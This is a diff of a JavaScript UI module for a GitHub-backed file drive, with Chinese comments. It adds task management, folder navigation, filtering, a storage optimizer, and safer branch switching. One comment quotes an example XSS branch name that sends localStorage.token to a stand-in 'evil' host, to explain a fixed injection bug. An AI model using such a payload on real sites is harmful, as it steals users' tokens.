+                        <div style="font-size:11px;color:#9ca3af;margin-top:3px;">${ago(t.startedAt)}</div>
+                    </div>
+                  </div>`;
+        }
+
+        const finished = all.filter(t => t.status !== 'running').length;
+        h += `<div style="margin-top:14px;display:flex;gap:8px;flex-wrap:wrap;">
+                ${finished ? '<button class="btn-secondary btn-sm" onclick="ui.clearFinishedTasks()">清除已结束的（${finished}）</button>' : ''}
+                <button class="btn-secondary btn-sm" onclick="typeof TaskDock!=='undefined'&&TaskDock.resumeMini&&TaskDock.resumeMini();ui.closeModal();">关闭</button>
+              </div>`.replace('${finished}', finished);
+        return h;
+    }
+
+    _bindTaskManager(box) {
+        if (!box) return;
+        box.querySelectorAll('.task-mgr-row').forEach(row => {
+            row.addEventListener('click', () => {
+                const id = row.getAttribute('data-id');
+                if (id && typeof TaskDock !== 'undefined' && TaskDock.open) TaskDock.open(id);
+            });
+        });
+    }
+
+    /** 清除已结束（完成/失败）的任务 */
+    clearFinishedTasks() {
+        if (typeof TaskDock === 'undefined' || !TaskDock.all) return;
+        for (const t of TaskDock.all()) {
+            if (t.status !== 'running' && TaskDock.remove) TaskDock.remove(t.id);
+        }
+        this.showTaskManager();
+    }
+
+    /** 更新"后台进程"入口的角标 */
+    updateTaskBadge() {
+        let running = 0;
+        try {
+            if (typeof TaskDock !== 'undefined' && TaskDock.all) {
+                running = TaskDock.all().filter(t => t.status === 'running').length;
+            }
+        } catch (e) { return; }
+        const show = running > 0;
+        [[ 'nav-badge-tasks', 'mobile-badge-tasks' ]].flat().forEach(id => {
+            const el = document.getElementById(id);
+            if (!el) return;
+            el.style.display = show ? '' : 'none';
+            el.textContent = running > 99 ? '99+' : String(running);
+        });
+    }
+
+    // ==================== 移动端「更多」面板 ====================
+
+    /**
+     * 移动端唯一导航：左侧抽屉。
+     *
+     * ★ 演变：原来移动端左侧是抽屉、底部又是 tab，两套入口干同一件事 ——
+     *   用户直接问"为什么左边有侧边栏，下面也有侧边栏"。
+     *   中间一度改成"底部 tab + 更多面板"，用户选了反过来：
+     *   留抽屉、去掉底部。理由是抽屉装得下更多条目，
+     *   而底部只能塞 5 个图标，后台进程之类的功能挤不进去。
+     */
+    toggleMobileMenu(force) {
+        const sidebar = document.querySelector('.sidebar');
+        if (!sidebar) return;
+        // 电脑端侧边栏本来就常驻，不需要抽屉
+        try {
+            if (!(window.matchMedia && window.matchMedia('(max-width: 768px)').matches)) return;
+        } catch (e) { return; }
+
+        // ★ 关键：清掉 as-sheet。侧边栏节点是复用的，
+        //   旧版把它变成过"从底部滑出"的面板，残留这个 class 会让抽屉从底部冒出来。
+        sidebar.classList.remove('as-sheet');
+
+        // 用侧边栏自己的遮罩（#sidebar-overlay），不再另建 sheet-overlay
+        let overlay = document.getElementById('sidebar-overlay');
+        if (overlay && !overlay._gdBound) {
+            overlay.addEventListener('click', () => this.toggleMobileMenu(false));
+            overlay._gdBound = true;
+        }
+
+        const open = force !== undefined ? force : !sidebar.classList.contains('open');
+        sidebar.classList.toggle('open', open);
+        if (overlay) overlay.classList.toggle('active', open);
+    }
+
+    // ==================== 工具栏：文件夹导航 / 高级筛选 ====================
+
+    /** HTML 转义（渲染文件名、路径等不可信内容时必须用） */
+    _escHtml(v) {
+        return String(v == null ? '' : v).replace(/[&<>"']/g, c =>
+            ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
+    }
+
+    /** 属性转义：比 _escHtml 多转义反引号和等号，防止拼进 data-* 后截断属性 */
+    _escAttr(v) {
+        return this._escHtml(v).replace(/`/g, '&#96;').replace(/=/g, '&#61;');
+    }
+
+    /**
+     * 🗂️ 文件夹导航
+     *
+     * ★ 为什么之前"按了没反应"：
+     *   index.html 里绑了 click → this.showFolderTree()，
+     *   但这个方法从来没被实现过 —— 点了直接抛
+     *   "this.showFolderTree is not a function"，界面上没有任何反应。
+     *   这是最容易漏的一类 bug：绑定写了、实现没写，静态看不出来。
+     */
+    showFolderTree() {
+        const vfs = this.app?.storage?.getVFS?.();
+        if (!vfs) { this.showToast?.('数据还没加载完', 'info'); return; }
+
+        // 从 vfs.folders 还原整棵树（它是 path -> info 的扁平 map）
+        const paths = Object.keys(vfs.folders || {}).filter(p => p && p !== '/drive_home');
+        if (!paths.length) {
+            this.showModal('🗂️ 文件夹导航',
+                '<div style="font-size:13px;color:#6b7280;padding:8px 0;">还没有任何文件夹</div>', '', true);
+            return;
+        }
+        paths.sort();
+
+        // 每个文件夹下挂多少文件（只数直接子文件，够用且不卡）
+        const countIn = (dir) => {
+            const prefix = dir + '/';
+            return Object.keys(vfs.files || {}).filter(f =>
+                f.startsWith(prefix) && !f.substring(prefix.length).includes('/')).length;
+        };
+
+        const cur = this.app.fileManager?.getCurrentPath?.() || '/drive_home';
+        const rows = paths.map(p => {
+            const name = p.split('/').pop() || p;
+            const depth = p.split('/').length - 2;          // /drive_home/x 的 depth = 0
+            const n = countIn(p);
+            const isCur = p === cur;
+            return `<div class="ft-row${isCur ? ' is-cur' : ''}" data-path="${this._escAttr(p)}"
+                        style="padding-left:${8 + Math.max(0, depth) * 16}px">
+                        <span class="ft-ico">📁</span>
+                        <span class="ft-name">${this._escHtml(name)}</span>
+                        <span class="ft-count">${n ? n + ' 个文件' : '空'}</span>
+                    </div>`;
+        }).join('');
+
+        const body = `<div class="folder-tree" id="folder-tree-box">${rows}</div>`;
+        this.showModal('🗂️ 文件夹导航', body, '', true);
+
+        document.getElementById('folder-tree-box')?.querySelectorAll('.ft-row').forEach(row => {
+            row.addEventListener('click', () => {
+                const path = row.getAttribute('data-path');
+                this.closeModal?.();
+                this.app.fileManager?.setCurrentPath?.(path);
+                this.app.fileManager?.setCurrentRepo?.(null);
+                this.switchView('all-files');
+                // switchView('all-files') 会把路径重置成 last_state，这里再改回去
+                setTimeout(() => {
+                    this.app.fileManager?.setCurrentPath?.(path);
+                    this.app.loadFiles?.();
+                }, 0);
+            });
+        });
+    }
+
+    /**
+     * ⚙️ 高级筛选
+     *
+     * ★ 同样是"绑了 click 但方法没实现"，点了完全没反应。
+     */
+    showAdvancedSearch() {
+        const vfs = this.app?.storage?.getVFS?.();
+        if (!vfs) { this.showToast?.('数据还没加载完', 'info'); return; }
+
+        // 统计现有扩展名，避免给用户一个空的分类列表
+        const exts = new Set();
+        Object.keys(vfs.files || {}).forEach(f => {
+            const m = f.match(/\.([^./]+)$/);
+            if (m) exts.add(m[1].toLowerCase());
+        });
+        const extList = [...exts].sort();
+
+        const body = `
+            <div class="adv-search" id="adv-search-box">
+                <div class="adv-field">
+                    <label>文件类型</label>
+                    <div class="adv-chips" id="adv-exts">
+                        <span class="adv-chip is-on" data-ext="">全部</span>
+                        ${extList.map(e => `<span class="adv-chip" data-ext="${this._escAttr(e)}">.${this._escHtml(e)}</span>`).join('')}
+                    </div>
+                </div>
+                <div class="adv-field">
+                    <label>大小</label>
+                    <select id="adv-size">
+                        <option value="">不限</option>
+                        <option value="s">&lt; 1 MB</option>
+                        <option value="m">1 MB ~ 10 MB</option>
+                        <option value="l">&gt; 10 MB</option>
+                    </select>
+                </div>
+                <div class="adv-field">
+                    <label>名称包含</label>
+                    <input type="text" id="adv-name" placeholder="留空则不过滤">
+                </div>
+                <div id="adv-count" class="adv-count"></div>
+                <div class="adv-actions">
+                    <button class="btn-secondary" id="adv-cancel">取消</button>
+                    <button class="btn-primary" id="adv-apply">🔍 应用筛选</button>
+                </div>
+            </div>`;
+
+        // ★ 注意：showModal 只收 4 个参数，第 5 个按钮数组会被静默忽略 ——
+        //   按钮根本渲染不出来。所以按钮直接放进 body，
+        //   不去改 showModal 签名（它还有 30+ 处调用）。
+        this.showModal('⚙️ 高级筛选', body, '', true);
+        document.getElementById('adv-cancel')?.addEventListener('click', () => this.closeModal?.());
+        document.getElementById('adv-apply')?.addEventListener('click', () => this._applyAdvancedSearch());
+
+        const box = document.getElementById('adv-search-box');
+        box?.querySelectorAll('.adv-chip').forEach(chip => {
+            chip.addEventListener('click', () => {
+                box.querySelectorAll('.adv-chip').forEach(c => c.classList.remove('is-on'));
+                chip.classList.add('is-on');
+                if (chip.getAttribute('data-ext') !== '') {
+                    box.querySelectorAll('.adv-chip').forEach(c => {
+                        if (c.getAttribute('data-ext') === '') c.classList.remove('is-on');
+                    });
+                }
+            });
+        });
+        box?.querySelectorAll('#adv-size,#adv-name').forEach(el =>
+            el.addEventListener('input', () => this._previewAdvancedSearch()));
+        box?.querySelectorAll('.adv-chip').forEach(c =>
+            c.addEventListener('click', () => this._previewAdvancedSearch()));
+        this._previewAdvancedSearch();
+    }
+
+    _advFilter() {
+        const box = document.getElementById('adv-search-box');
+        const ext = box?.querySelector('.adv-chip.is-on')?.getAttribute('data-ext') || '';
+        const size = box?.querySelector('#adv-size')?.value || '';
+        const name = (box?.querySelector('#adv-name')?.value || '').trim().toLowerCase();
+        const vfs = this.app.storage.getVFS();
+
+        return Object.entries(vfs.files || {}).filter(([path, info]) => {
+            if (ext && !path.toLowerCase().endsWith('.' + ext)) return false;
+            if (name && !path.toLowerCase().includes(name)) return false;
+            const sz = info.size || 0;
+            if (size === 's' && sz >= 1024 * 1024) return false;
+            if (size === 'm' && (sz < 1024 * 1024 || sz >= 10 * 1024 * 1024)) return false;
+            if (size === 'l' && sz < 10 * 1024 * 1024) return false;
+            return true;
+        }).map(([path, info]) => ({ ...info, path, isFile: true }));
+    }
+
+    _previewAdvancedSearch() {
+        const el = document.getElementById('adv-count');
+        if (!el) return;
+        try {
+            const n = this._advFilter().length;
+            el.textContent = n ? `匹配 ${n} 个文件` : '没有匹配的文件';
+        } catch (e) { /* 预览失败不影响应用 */ }
+    }
+
+    _applyAdvancedSearch() {
+        let items = [];
+        try { items = this._advFilter(); } catch (e) { items = []; }
+        this.closeModal?.();
+        this.app.currentFiles = items;
+        this.app._isFilterResult = true;
+        this.ui?.renderFileList?.(items);
+        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+        this.showToast?.(`筛选出 ${items.length} 个文件`, 'info');
+    }
+
+    /**
+     * 移动端是否禁用插件。
+     *
+     * ★ 改过一次：原来返回 true（移动端一律拦截），理由是"下载不了插件后端"。
+     *   但实际上插件有两种来源：仓库里的 html（blob 直接跑）和外部 URL，
+     *   都不依赖本地后端，移动端能跑。
+     *   现在返回 false —— 移动端照样用插件，只是交互换成手机习惯的那套
+     *   （见 _mountMobilePlugin：不飘小窗，去「后台进程」里看实时预览）。
+     */
+    isPluginsBlocked() {
+        return false;
+    }
+
+    /** 窄屏判定（<=768px）：插件走移动端交互，任务坞小窗也据此隐藏 */
+    isMobileViewport() {
+        try {
+            return !!(window.matchMedia && window.matchMedia('(max-width: 768px)').matches);
+        } catch (e) { return false; }
+    }
+
+    /** 存储仓库管理（内容由 app.showStorageManager 填充） */
+    showStorageManager() {
+        const body = '<div id="storage-mgr-body" style="padding:8px 0;">'
+                   + '<div style="font-size:13px;color:#6b7280;">正在读取仓库体积…</div></div>';
+        this.showModal('🗂️ 存储仓库管理', body, '', true);
+        // 弹窗已插入 DOM 后再异步填充
+        setTimeout(() => this.app?.showStorageManager?.(), 50);
+    }
+
+    /**
+     * 一键优化仓库存储
+     *
+     * ★ 与"仓库维护"的区别：
+     *   维护 = 把孤儿恢复成可见文件（只增不删）
+     *   优化 = 把孤儿彻底删掉（释放容量）
+     *
+     *   用户遇到的是"仓库满了传不进去"，要的是后者。
+     */
+    showStorageOptimizer() {
+        const body = `
+            <div style="padding:8px 0;">
+                <div style="font-size:13px;color:#6b7280;line-height:1.6;margin-bottom:14px;">
+                    扫描仓库，找出三类问题：<br>
+                    · <b>用量登记虚高</b>——"存储满了"最常见的真因，校准即可找回<br>
+                    · <b>孤儿分片</b>——覆盖上传留下的旧数据，可删除释放<br>
+                    · <b>幽灵记录</b>——文件已丢失但记录还在，点了就报错
+                </div>
+                <div id="opt-result" style="display:none;margin-bottom:14px;"></div>
+                <button id="opt-scan-btn" class="btn-primary btn-sm"
+                    onclick="ui.runStorageOptimize('scan')">
+                    🔍 先看看能释放多少
+                </button>
+            </div>
+        `;
+        this.showModal('⚡ 一键优化仓库存储', body, '', true);
+    }
+
+    _optFmt(n) {
+        const u = ['B', 'KB', 'MB', 'GB', 'TB'];
+        let i = 0; n = parseFloat(n || 0);
+        while (n >= 1024 && i < u.length - 1) { n /= 1024; i++; }
+        return (i === 0 ? Math.round(n) : n.toFixed(1)) + ' ' + u[i];
+    }
+
+    async runStorageOptimize(stage) {
+        const box = document.getElementById('opt-result');
+        const btn = document.getElementById('opt-scan-btn');
+        if (!box) return;
+        box.style.display = 'block';
+
+        const app = this.app;
+        if (!app.maintain) app.maintain = new Maintain(app.api, app.storage);
+
+        if (stage === 'scan') {
+            btn.disabled = true;
+            btn.textContent = '扫描中…';
+            box.innerHTML = '<div style="font-size:13px;color:#6b7280;">正在读取仓库文件树…</div>';
+            try {
+                const rep = await app.maintain.scan((d, t, l) => {
+                    box.innerHTML = '<div style="font-size:13px;color:#6b7280;">扫描中 ' + d + '/' + t + '：' + l + '</div>';
+                });
+                this._optReport = rep;
+                box.innerHTML = this._renderOptimizeReport(rep);
+                btn.textContent = '重新扫描';
+                btn.disabled = false;
+            } catch (e) {
+                box.innerHTML = '<div style="color:#dc2626;font-size:13px;">扫描失败：' + (e && e.message || e) + '</div>';
+                btn.textContent = '重试';
+                btn.disabled = false;
+            }
+            return;
+        }
+
+        if (stage === 'recalibrate') { await this.runRecalibrate(); return; }
+        if (stage === 'dropGhosts') { await this.runDropGhosts(); return; }
+
+        if (stage === 'purge') {
+            const rep = this._optReport;
+            if (!rep || !rep.orphans || !rep.orphans.length) return;
+            const dry = await app.maintain.purge(rep.orphans, { dryRun: true });
+            if (!dry.would_delete) {
+                box.innerHTML = '<div style="color:#059669;font-size:13px;">✓ 没有需要清理的内容</div>';
+                return;
+            }
+            // ★ 删除不可逆，必须让用户明确输入数量确认，不能只有一个 confirm
+            const answer = prompt(
+                '将永久删除 ' + dry.would_delete + ' 个孤儿分片，释放 ' + this._optFmt(dry.freed_bytes) + '。\n\n' +
+                '此操作不可撤销（GitHub 仓库历史里仍可找回，但 Drive 里看不到了）。\n' +
+                '确认请输入数字 ' + dry.would_delete + ' ：');
+            if (answer === null) { box.innerHTML = '<div style="font-size:13px;color:#6b7280;">已取消</div>'; return; }
+            if (String(answer).trim() !== String(dry.would_delete)) {
+                box.innerHTML = '<div style="color:#dc2626;font-size:13px;">数字不一致，已取消</div>';
+                return;
+            }
+
+            box.innerHTML = '<div style="font-size:13px;color:#6b7280;">正在删除…</div>';
+            try {
+                const res = await app.maintain.purge(rep.orphans, {
+                    onProgress: (d, t, l) => {
+                        box.innerHTML = '<div style="font-size:13px;color:#6b7280;">删除中 ' + d + '/' + t + '：' + l + '</div>';
+                    }
+                });
+                let h = '<div style="font-size:13px;line-height:1.7;">';
+                h += '<div style="color:#059669;">✓ 已释放 <b>' + this._optFmt(res.freed_bytes) + '</b></div>';
+                h += '删除 <b>' + res.deleted.length + '</b> 个分片<br>';
+                if (res.skipped_system) h += '<span style="color:#6b7280;">跳过系统文件 ' + res.skipped_system + ' 个（README 等）</span><br>';
+                if (res.skipped_stale) h += '<span style="color:#6b7280;">跳过 ' + res.skipped_stale + ' 个（扫描后又变成在用状态）</span><br>';
+                if (res.failed.length) h += '<span style="color:#dc2626;">失败 ' + res.failed.length + ' 个</span>';
+                h += '</div>';
+                box.innerHTML = h;
+                this._optReport = null;
+                if (app.loadFiles) app.loadFiles();
+            } catch (e) {
+                box.innerHTML = '<div style="color:#dc2626;font-size:13px;">清理失败：' + (e && e.message || e) + '</div>';
+            }
+        }
+    }
+
+    /**
+     * 渲染优化报告。
+     *
+     * ★ 关键改动：以前只看孤儿，没有孤儿就报"无需清理" ——
+     *   但用户遇到的"存储满了"往往根本不是孤儿造成的，
+     *   而是**用量登记值虚高**（recalibrate 能解决）。
+     *   所以这里必须同时给出登记值 vs 实际值的偏差，并提供校准入口。
+     */
+    _renderOptimizeReport(rep) {
+        const fmt = this._optFmt;
+        let h = '<div style="font-size:13px;line-height:1.7;">';
+        h += '记录占用 <b>' + fmt(rep.recorded_bytes) + '</b>　' +
+             '仓库实际 <b>' + fmt(rep.actual_bytes) + '</b><br>';
+
+        // ── ① 用量登记偏差（最常见的"满了"真因）──
+        const usage = rep.usage_actual || {};
+        const reg = (this.app && this.app.storage) ? this.app.storage.getRepoUsage() : {};
+        let regTotal = 0, actTotal = 0;
+        const drift = [];
+        for (const key of Object.keys(usage)) {
+            const a = parseInt(usage[key], 10) || 0;
+            const r = (reg[key] && reg[key].size) || 0;
+            regTotal += r; actTotal += a;
+            if (r - a > 1048576) drift.push({ key: key, before: r, after: a });
+        }
+        const driftBytes = Math.max(0, regTotal - actTotal);
+        if (drift.length) {
+            const pct = regTotal ? (driftBytes / regTotal * 100).toFixed(0) : 0;
+            h += '<div style="color:#dc2626;margin-top:10px;">' +
+                 '★ 用量登记虚高 <b>' + fmt(driftBytes) + '</b>（' + pct + '%）' +
+                 '<div style="font-size:12px;color:#6b7280;margin-top:4px;line-height:1.5;">' +
+                 '登记 ' + fmt(regTotal) + '，仓库实际只有 ' + fmt(actTotal) + '。<br>' +
+                 '选仓库和"是否已满"看的是登记值 —— 这就是为什么明明有空间却传不进去。</div></div>';
+            h += '<button class="btn-primary btn-sm" style="margin-top:10px;" ' +
+                 'onclick="ui.runStorageOptimize(\'recalibrate\')">🔧 校准用量（不删任何文件）</button>';
+        }
+
+        // ── ② 孤儿 ──
+        if (rep.orphans.length) {
+            const pct = rep.actual_bytes
+                ? (rep.orphan_bytes / rep.actual_bytes * 100).toFixed(0) : 0;
+            h += '<div style="color:#d97706;margin-top:10px;">' +
+                 '孤儿 <b>' + rep.orphans.length + '</b> 个 · 可释放 <b>' + fmt(rep.orphan_bytes) + '</b>' +
+                 '（占仓库 ' + pct + '%）</div>';
+            h += '<button class="btn-primary btn-sm" style="margin-top:10px;" ' +
+                 'onclick="ui.runStorageOptimize(\'purge\')">⚡ 立即清理</button>';
+        }
+
+        // ── ③ 幽灵 ──
+        if (rep.ghosts.length) {
+            h += '<div style="color:#dc2626;margin-top:10px;">' +
+                 '⚠ 幽灵 <b>' + rep.ghosts.length + '</b> 个：文件已不在仓库，下载必失败' +
+                 '<div style="font-size:12px;color:#6b7280;margin-top:4px;">' +
+                 '数据已经丢了，但记录还占着容量、点了就报错。</div></div>';
+            h += '<button class="btn-danger btn-sm" style="margin-top:10px;" ' +
+                 'onclick="ui.runStorageOptimize(\'dropGhosts\')">🗑 移除这些失效记录</button>';
+        }
+
+        if (!drift.length && !rep.orphans.length && !rep.ghosts.length) {
+            h += '<div style="color:#059669;margin-top:10px;">✓ 仓库是干净的，没有孤儿也没有虚高</div>';
+        }
+        return h + '</div>';
+    }
+
+    async runRecalibrate() {
+        const box = document.getElementById('opt-result');
+        if (!box) return;
+        const rep = this._optReport;
+        if (!rep) return;
+        const app = this.app;
+        box.innerHTML = '<div style="font-size:13px;color:#6b7280;">正在校准…</div>';
+        try {
+            const r = await app.maintain.recalibrateUsage(rep);
+            let h = '<div style="font-size:13px;line-height:1.7;">';
+            h += '<div style="color:#059669;">✓ 已校准，找回 <b>' + this._optFmt(r.freedBytes) + '</b> 虚假占用</div>';
+            h += '<div style="font-size:12px;color:#6b7280;">' +
+                 '登记 ' + this._optFmt(r.beforeBytes) + ' → ' + this._optFmt(r.afterBytes) +
+                 '（修正 ' + r.fixed.length + ' 个仓库，未删除任何文件）</div>';
+            for (const f of r.fixed.slice(0, 5)) {
+                h += '<div style="font-size:12px;color:#6b7280;">· ' + f.key.split('/')[1] +
+                     '：' + this._optFmt(f.before) + ' → ' + this._optFmt(f.after) + '</div>';
+            }
+            h += '</div>';
+            box.innerHTML = h;
+            if (app.loadFiles) app.loadFiles();
+        } catch (e) {
+            box.innerHTML = '<div style="color:#dc2626;font-size:13px;">校准失败：' + (e && e.message || e) + '</div>';
+        }
+    }
+
+    async runDropGhosts() {
+        const box = document.getElementById('opt-result');
+        if (!box) return;
+        const rep = this._optReport;
+        if (!rep || !rep.ghosts || !rep.ghosts.length) return;
+        const app = this.app;
+        const dry = await app.maintain.dropGhosts(rep.ghosts, { dryRun: true });
+        const paths = Array.from(new Set(rep.ghosts.map(g => g.vpath)));
+        const answer = prompt(
+            '将移除 ' + dry.would_remove + ' 条失效的文件记录：\n\n' +
+            paths.slice(0, 5).join('\n') + (paths.length > 5 ? '\n…' : '') + '\n\n' +
+            '这些文件的分片在仓库里已经不存在，本来也下不下来。\n' +
+            '此操作只删 Drive 里的记录，不会删除仓库中任何文件。\n\n' +
+            '确认请输入数字 ' + dry.would_remove + ' ：');
+        if (answer === null) { box.innerHTML = '<div style="font-size:13px;color:#6b7280;">已取消</div>'; return; }
+        if (String(answer).trim() !== String(dry.would_remove)) {
+            box.innerHTML = '<div style="color:#dc2626;font-size:13px;">数字不一致，已取消</div>';
+            return;
+        }
+        try {
+            const res = await app.maintain.dropGhosts(rep.ghosts, {});
+            box.innerHTML = '<div style="color:#059669;font-size:13px;">✓ 已移除 ' +
+                res.removed.length + ' 条失效记录</div>';
+            this._optReport = null;
+            if (app.loadFiles) app.loadFiles();
+        } catch (e) {
+            box.innerHTML = '<div style="color:#dc2626;font-size:13px;">移除失败：' + (e && e.message || e) + '</div>';
+        }
     }
 
     /**
@@ -1441,133 +2470,328 @@ class UI {
         }
     }
 
+    /** 分支名白名单校验。清单/URL/手输三处共用，不能各写各的。 */
+    _safeBranch(b) {
+        if (typeof b !== 'string') return null;
+        const t = b.trim();
+        if (!t || t.length > 200) return null;
+        if (!/^[A-Za-z0-9._\/-]+$/.test(t)) return null;
+        if (t.indexOf('..') !== -1) return null;
+        return t;
+    }
+
+    /**
+     * 版本广场
+     *
+     * ★ 与旧版的三处关键差别：
+     *   1. 切换前先探活。实测 preview/AI-Agent/dark-mode 在 jsdelivr 上是
+     *      404 —— 点下去就是白屏，而白屏里设置页打不开，切不回来（死锁）。
+     *      现在不可用的分支直接标灰、点了也不加载。
+     *   2. 分支清单不只看 preview-branches.json（它漏了 10 个分支，
+     *      实际有 22 个），改为登录后用 API 列出全部 preview/* 再合并元数据。
+     *   3. 手动输入分支名之前没有校验（loadVersion 有、switchBranch 没有），
+     *      现在统一走 _safeBranch。
+     */
     showVersionSwitcher() {
-        const currentBranch = localStorage.getItem('gd_custom_branch') || 'main';
+        this._vsFilter = '';
+        this._vsSort = 'time';
+        const cur = localStorage.getItem('gd_custom_branch') || 'main';
         const body = `
             <div style="padding:8px 0;">
-                <div style="background:#eff6ff;border:1px solid #bfdbfe;border-radius:8px;padding:12px;margin-bottom:16px;">
+                <div style="background:#eff6ff;border:1px solid #bfdbfe;border-radius:8px;padding:12px;margin-bottom:14px;">
                     <div style="font-size:13px;color:#1e40af;font-weight:600;margin-bottom:4px;">💡 版本广场</div>
                     <div style="font-size:12px;color:#1e40af;line-height:1.5;">
-                        开发者通过 Pull Request 提交改进，系统自动创建预览分支并展示在这里。<br>
-                        点击任意版本即可加载体验。
+                        开发者通过 Pull Request 提交改进，系统自动创建预览分支。<br>
+                        切换前会先检测该版本能否加载，不可用的不会让你点进去。
                     </div>
                 </div>
-                
-                <div style="margin-bottom:16px;display:flex;align-items:center;justify-content:space-between;">
+
+                <div style="margin-bottom:12px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;">
                     <div>
                         <div style="font-size:12px;color:#6b7280;">当前版本</div>
-                        <div style="font-family:monospace;font-size:14px;font-weight:600;color:#374151;">${currentBranch === 'main' ? '🏠 官方版 (main)' : '🔀 ' + currentBranch}</div>
+                        <div style="font-family:monospace;font-size:14px;font-weight:600;color:#374151;">${cur === 'main' ? '🏠 官方版 (main)' : '🔀 ' + this.escapeHtml(cur)}</div>
                     </div>
-                    ${currentBranch !== 'main' ? '<button onclick="ui.resetToMain()" style="padding:8px 14px;background:#f3f4f6;color:#374151;border:none;border-radius:6px;cursor:pointer;font-size:12px;">🏠 恢复官方版</button>' : ''}
+                    ${cur !== 'main' ? '<button onclick="ui.resetToMain()" style="padding:8px 14px;background:#f3f4f6;color:#374151;border:1px solid #d1d5db;border-radius:6px;cursor:pointer;font-size:12px;">🏠 恢复官方版</button>' : ''}
                 </div>
-                
+
+                <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;">
+                    <input type="text" id="vs-search" placeholder="🔍 搜索版本 / 作者"
+                        oninput="ui._vsFilter=this.value;ui._renderVersionList();"
+                        style="flex:1;min-width:160px;padding:8px 10px;border:1px solid #d1d5db;border-radius:6px;font-size:12px;">
+                    <select id="vs-sort" onchange="ui._vsSort=this.value;ui._renderVersionList();"
+                        style="padding:8px 10px;border:1px solid #d1d5db;border-radius:6px;font-size:12px;background:#fff;">
+                        <option value="time">按更新时间</option>
+                        <option value="author">按作者</option>
+                        <option value="name">按名称</option>
+                    </select>
+                </div>
+
                 <div style="border-top:1px solid #e5e7eb;padding-top:12px;">
-                    <div style="font-size:13px;font-weight:600;color:#374151;margin-bottom:10px;">🌟 社区版本</div>
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                        <div style="font-size:13px;font-weight:600;color:#374151;">🌟 社区版本</div>
+                        <div id="vs-count" style="font-size:11px;color:#9ca3af;"></div>
+                    </div>
                     <div id="version-plaza" style="max-height:400px;overflow-y:auto;">
                         <div style="text-align:center;padding:20px;color:#9ca3af;font-size:13px;">加载中...</div>
                     </div>
                 </div>
-                
-                <div style="margin-top:16px;padding-top:12px;border-top:1px solid #e5e7eb;">
+
+                <div style="margin-top:14px;padding-top:12px;border-top:1px solid #e5e7eb;">
                     <details style="font-size:12px;color:#6b7280;">
                         <summary style="cursor:pointer;">⚙️ 高级：手动输入分支名</summary>
                         <div style="margin-top:8px;display:flex;gap:8px;">
-                            <input type="text" id="branch-input" placeholder="preview/author/feature-name" 
+                            <input type="text" id="branch-input" placeholder="preview/author/feature-name"
                                 style="flex:1;padding:8px 10px;border:1px solid #d1d5db;border-radius:6px;font-size:12px;font-family:monospace;">
                             <button onclick="ui.switchBranch()" style="padding:8px 14px;background:#2563eb;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px;">加载</button>
                         </div>
                     </details>
                 </div>
+
+                <div id="vs-status" style="display:none;margin-top:12px;font-size:12px;"></div>
             </div>
         `;
         this.showModal('🌐 版本广场', body, '', true);
         this.loadVersionPlaza();
     }
 
-    async loadVersionPlaza() {
-        try {
-            // 从 main 分支读取 preview-branches.json 配置清单
-            const res = await fetch('https://raw.githubusercontent.com/Cool-zimo/github_drive/main/preview-branches.json?t=' + Date.now());
-            if (!res.ok) throw new Error('配置清单加载失败');
-            const data = await res.json();
-            
-            const plazaEl = document.getElementById('version-plaza');
-            if (!plazaEl) return;
-            
-            if (!data.branches || data.branches.length === 0) {
-                plazaEl.innerHTML = '<div style="text-align:center;padding:30px;color:#9ca3af;font-size:13px;">暂无社区版本<br><span style="font-size:11px;">成为第一个贡献者吧！</span></div>';
-                return;
-            }
-            
-            // ★ 分支名来自 preview-branches.json（可由 PR 的 config.json 写入），
-            //   不是可信输入。早期版本把它直接拼进 innerHTML 和
-            //   onclick="ui.loadVersion('${b.branch}')" —— 一个形如
-            //   preview/x');fetch('//evil?t='+localStorage.token)// 的分支名
-            //   就能在官网（以及桌面版）上执行任意 JS。
-            //   现在：先按白名单过滤分支名，再用 data-* + 事件委托渲染，
-            //   文本位置一律转义，属性位置用 escapeAttr（连引号一起转）。
-            const SAFE_BRANCH = /^[A-Za-z0-9._\/-]+$/;
-            plazaEl.innerHTML = data.branches
-                .filter(b => b && typeof b.branch === 'string'
-                          && SAFE_BRANCH.test(b.branch)
-                          && b.branch.indexOf('..') === -1)
-                .map(b => {
-                const isCurrent = localStorage.getItem('gd_custom_branch') === b.branch;
-                return `
-                <div data-branch="${this.escapeAttr(b.branch)}" 
-                    style="padding:12px;border:1px solid ${isCurrent ? '#2563eb' : '#e5e7eb'};border-radius:8px;margin-bottom:8px;cursor:pointer;background:${isCurrent ? '#eff6ff' : '#fff'};"
-                    onmouseover="this.style.borderColor='#2563eb';this.style.background='#f8fafc'" 
-                    onmouseout="this.style.borderColor='${isCurrent ? '#2563eb' : '#e5e7eb'}';this.style.background='${isCurrent ? '#eff6ff' : '#fff'}'">
-                    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;">
-                        <div style="font-weight:600;font-size:14px;color:#111827;">${this.escapeHtml(b.name || b.branch)}</div>
-                        <span style="font-size:11px;background:#f3f4f6;color:#6b7280;padding:2px 8px;border-radius:10px;">v${this.escapeHtml(b.version || '1.0.0')}</span>
-                    </div>
-                    <div style="font-size:12px;color:#6b7280;margin-bottom:4px;">👤 ${this.escapeHtml(b.author || 'unknown')}</div>
-                    <div style="font-size:12px;color:#374151;line-height:1.4;">${this.escapeHtml(b.description || '暂无描述')}</div>
-                    <div style="font-size:11px;color:#9ca3af;margin-top:6px;font-family:monospace;">${this.escapeHtml(b.branch)}</div>
-                    ${isCurrent ? '<div style="font-size:11px;color:#2563eb;margin-top:4px;font-weight:600;">✅ 当前使用中</div>' : ''}
-                </div>`;
-            }).join('');
+    _vsStatus(msg, color) {
+        const el = document.getElementById('vs-status');
+        if (!el) return;
+        el.style.display = msg ? 'block' : 'none';
+        el.style.color = color || '#6b7280';
+        el.innerHTML = msg || '';
+    }
 
-            // 事件委托取代内联 onclick —— 分支名不再进入 JS 代码上下文
-            plazaEl.querySelectorAll('[data-branch]').forEach(el => {
-                el.addEventListener('click', () => {
-                    this.loadVersion(el.getAttribute('data-branch'));
-                });
-            });
+    /**
+     * 探测某个分支在 jsdelivr 上是否真的能取到资源。
+     *
